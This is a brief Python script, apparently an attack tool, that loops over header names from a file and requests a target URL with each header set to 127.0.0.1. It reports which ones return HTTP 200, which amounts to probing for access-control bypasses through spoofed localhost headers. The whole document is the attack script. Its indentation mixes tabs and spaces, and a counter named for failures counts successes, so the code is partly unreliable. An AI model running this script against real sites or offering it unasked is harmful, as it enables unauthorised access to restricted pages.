import requests
import sys
with open('headers.txt','r') as f: #the file contains the bypass headers
    headersx = [line.strip() for line in f]#we read the file than pass it to a list
f.close()
target=(sys.argv[1])#Passing parameter value into a variable
failedbypass=0;#If all the headers fails then program will use this value to tell all of them failed
for header in headersx:
       	headers = {''+header :'127.0.0.1'}
	req = requests.get(target, headers=headers)#request happens here 
	if req.status_code == 200:
   	 	print('This Payload is succesfull => '+header+':127.0.0.1' )
		failedbypass=failedbypass+1;#adds 1 to failedbypass value if any header is successfull   		
if(failedbypass==0):
	print('None of them succeeded')
